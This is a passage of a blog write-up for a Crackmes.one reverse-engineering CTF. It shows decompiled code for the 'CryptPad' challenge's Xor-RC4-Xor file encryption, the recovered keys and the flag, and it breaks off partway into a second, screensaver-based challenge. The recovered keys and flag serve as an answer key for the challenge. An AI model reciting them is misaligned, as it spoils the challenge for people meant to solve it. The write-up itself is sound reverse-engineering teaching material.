<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>Crackmes.one Reverse Engineering CTF 2026 WriteUp | 棱晶の小窝</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="EasyCryptPadThe main logic is in sub_4014EB: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182">
<meta property="og:type" content="article">
<meta property="og:title" content="Crackmes.one Reverse Engineering CTF 2026 WriteUp">
<meta property="og:url" content="https://astralprisma.github.io/2026/02/21/crackme_26/index.html">
<meta property="og:site_name" content="棱晶の小窝">
<meta property="og:description" content="EasyCryptPadThe main logic is in sub_4014EB: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2026-02-21T00:00:00.000Z">
<meta property="article:modified_time" content="2026-02-20T23:36:34.946Z">
<meta property="article:author" content="Astral Prisma">
<meta property="article:tag" content="Golang">
<meta property="article:tag" content="Traffic">
<meta property="article:tag" content="Exception Handling">
<meta property="article:tag" content="Obfuscate">
<meta property="article:tag" content="Anti-Debug">
<meta property="article:tag" content="Selfhash">
<meta property="article:tag" content="SMC">
<meta property="article:tag" content="String Encryption">
<meta property="article:tag" content="AutoRe">
<meta property="article:tag" content="Indirect Jump">
<meta property="article:tag" content="HookAPI">
<meta property="article:tag" content="Side Channel">
<meta property="article:tag" content="Differential Cryptanalysis">
<meta name="twitter:card" content="summary">
  
  
    <link rel="shortcut icon" href="/AP.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/OTSA.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>棱晶の小窝 </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/XH_2.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Astral Prisma </div>
      <div class="dot"></div>
      <div class="subtitle">星界棱晶 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><image src=https://www.bilibili.com/favicon.ico></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><image src=https://www.primegrid.com/images/favicon_32.png></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><image src=https://github.githubassets.com/favicons/favicon.png></image></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/Ideas/">
                Ideas
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/WriteUp/">
                WriteUp
                <div class="category-count">40</div>
            </a>
        
            <a class="category-link" href="/categories/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/">
                出题记录
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">标签</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/got/" rel="tag">.got</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Anti-Debug/" rel="tag">Anti-Debug</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AutoRe/" rel="tag">AutoRe</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Brainfuck/" rel="tag">Brainfuck</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CUDA/" rel="tag">CUDA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Cheat-Engine/" rel="tag">Cheat Engine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DOS/" rel="tag">DOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Differential-Cryptanalysis/" rel="tag">Differential Cryptanalysis</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Driver/" rel="tag">Driver</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Exception-Handling/" rel="tag">Exception Handling</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Frida-Hook/" rel="tag">Frida Hook</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Golang/" rel="tag">Golang</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Harmony-OS/" rel="tag">Harmony OS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HookAPI/" rel="tag">HookAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IPC/" rel="tag">IPC</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Indirect-Jump/" rel="tag">Indirect Jump</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kotlin/" rel="tag">Kotlin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Lua/" rel="tag">Lua</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Mac/" rel="tag">Mac</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Obfuscate/" rel="tag">Obfuscate</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pascal/" rel="tag">Pascal</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pyarmor/" rel="tag">Pyarmor</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/QEMU/" rel="tag">QEMU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/R2R/" rel="tag">R2R</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Remote/" rel="tag">Remote</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rust/" rel="tag">Rust</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SMC/" rel="tag">SMC</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Selfhash/" rel="tag">Selfhash</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Side-Channel/" rel="tag">Side Channel</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/String-Encryption/" rel="tag">String Encryption</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Subprocess/" rel="tag">Subprocess</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Traffic/" rel="tag">Traffic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Unicorn/" rel="tag">Unicorn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WASM/" rel="tag">WASM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Wechat-Mini-Program/" rel="tag">Wechat Mini Program</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Windows-DLL/" rel="tag">Windows DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Yara/" rel="tag">Yara</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iOS/" rel="tag">iOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/il2cpp/" rel="tag">il2cpp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pickle/" rel="tag">pickle</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/x96/" rel="tag">x96</a></li></ul>
    </div>
  </div>


    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-crackme_26" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        Crackmes.one Reverse Engineering CTF 2026 WriteUp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2026-02-21T00:00:00.000Z" itemprop="datePublished">2026-02-21</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/WriteUp/">WriteUp</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            29k 词 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Anti-Debug/" rel="tag">Anti-Debug</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AutoRe/" rel="tag">AutoRe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Differential-Cryptanalysis/" rel="tag">Differential Cryptanalysis</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exception-Handling/" rel="tag">Exception Handling</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Golang/" rel="tag">Golang</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HookAPI/" rel="tag">HookAPI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Indirect-Jump/" rel="tag">Indirect Jump</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Obfuscate/" rel="tag">Obfuscate</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SMC/" rel="tag">SMC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Selfhash/" rel="tag">Selfhash</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Side-Channel/" rel="tag">Side Channel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/String-Encryption/" rel="tag">String Encryption</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Traffic/" rel="tag">Traffic</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h2><h3 id="CryptPad"><a href="#CryptPad" class="headerlink" title="CryptPad"></a>CryptPad</h3><p>The main logic is in sub_4014EB:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">CHAR __stdcall <span class="title">sub_4014EB</span><span class="params">(LPSTR lpMem, DWORD NumberOfBytesWritten, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    count = *(_DWORD *)&amp;lpMem[NumberOfBytesWritten - <span class="number">1</span>];</span><br><span class="line">    src = &amp;lpMem[NumberOfBytesWritten - <span class="number">1</span> - count];</span><br><span class="line">    <span class="built_in">qmemcpy</span>(dst_, src, count);</span><br><span class="line">    NumberOfBytesWritten_1 = *((_DWORD *)src - <span class="number">1</span>);</span><br><span class="line">    *((_DWORD *)src - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">    NumberOfBytesWritten = NumberOfBytesWritten_1;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = lpMem;</span><br><span class="line">  dst = dst_;</span><br><span class="line">  NumberOfBytesWritten_2 = ::NumberOfBytesWritten;</span><br><span class="line">LABEL_6:</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v7++ ^= *dst++;</span><br><span class="line">    <span class="keyword">if</span> ( ++v10 == <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    --NumberOfBytesWritten_2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( NumberOfBytesWritten_2 );</span><br><span class="line">  n256 = <span class="number">256</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    Sbox[(<span class="type">unsigned</span> __int8)-(<span class="type">char</span>)n256] = -(<span class="type">char</span>)n256;</span><br><span class="line">    --n256;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( n256 );</span><br><span class="line">  v12 = &amp;unk_403695;</span><br><span class="line">  n256_1 = <span class="number">256</span>;</span><br><span class="line">  n8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( n8 &gt;= <span class="number">8</span> )</span><br><span class="line">      n8 = <span class="number">0</span>;</span><br><span class="line">    *v12++ = dst_[n8++];</span><br><span class="line">    --n256_1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( n256_1 );</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = v12 - <span class="number">256</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  n256_2 = <span class="number">256</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v15) = Sbox[v17] + v16[v17] + v15;</span><br><span class="line">    v19 = Sbox[v17];</span><br><span class="line">    Sbox[v17] = Sbox[v15];</span><br><span class="line">    Sbox[v15] = v19;</span><br><span class="line">    ++v17;</span><br><span class="line">    --n256_2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( n256_2 );</span><br><span class="line">  v20 = lpMem;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  NumberOfBytesWritten_3 = NumberOfBytesWritten;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    NumberOfBytesWritten_4 = NumberOfBytesWritten_3;</span><br><span class="line">    v24 = (<span class="type">unsigned</span> __int8)(v21 + <span class="number">1</span>);</span><br><span class="line">    v32 = v20;</span><br><span class="line">    v25 = Sbox[v24];</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v22) = v25 + v22;</span><br><span class="line">    v26 = Sbox[v22];</span><br><span class="line">    Sbox[v24] = v26;</span><br><span class="line">    Sbox[v22] = v25;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v24) = Sbox[(<span class="type">unsigned</span> __int8)(v25 + v26)] ^ lpMem[v21];</span><br><span class="line">    v20 = v32;</span><br><span class="line">    v32[v21++] = v24;</span><br><span class="line">    NumberOfBytesWritten_3 = NumberOfBytesWritten_4 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( NumberOfBytesWritten_4 != <span class="number">1</span> );</span><br><span class="line">  v27 = lpMem;</span><br><span class="line">  dst_1 = dst_;</span><br><span class="line">  NumberOfBytesWritten_5 = ::NumberOfBytesWritten;</span><br><span class="line">LABEL_20:</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = *dst_1 ^ *v27;</span><br><span class="line">    *v27++ = result;</span><br><span class="line">    ++dst_1;</span><br><span class="line">    <span class="keyword">if</span> ( ++v30 == <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">    --NumberOfBytesWritten_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( NumberOfBytesWritten_5 );</span><br><span class="line">  <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dst_2 = &amp;lpMem[NumberOfBytesWritten - <span class="number">13</span> + dword_403581];</span><br><span class="line">    *(_DWORD *)dst_2 = NumberOfBytesWritten;</span><br><span class="line">    dst_2 += <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">qmemcpy</span>(dst_2, dst_, <span class="number">8u</span>);</span><br><span class="line">    dst_2[<span class="number">8</span>] = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">return</span> dword_403581 + NumberOfBytesWritten;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This is a Xor-RC4-Xor, and the xor key is <font color=red><strong>DE BC 0A 89 67 45 23 01</strong></font>, RC4 key has 8 bytes and was saved to the file’s end, as the structure is 4 byte message length + key + key length (8). The RC4 key is <font color=red><strong>E8 17 1B F4 50 3F 3D 70</strong></font>. </p>
<p><font color=deepskyblue><strong>CMO{r0ll_y0ur_0wn_b4d_c0d3}</strong></font></p>
<h3 id="FLRSCRNSVR-SCR"><a href="#FLRSCRNSVR-SCR" class="headerlink" title="FLRSCRNSVR.SCR"></a>FLRSCRNSVR.SCR</h3><p>The main logic:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS __fastcall <span class="title">sub_140001AE0</span><span class="params">(<span class="type">wchar_t</span> *Source)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cbData = <span class="number">512</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">RegOpenKeyExW</span>(HKEY_CURRENT_USER, <span class="string">L&quot;Control Panel\\Desktop&quot;</span>, <span class="number">0</span>, <span class="number">0x20019u</span>, &amp;hKey) 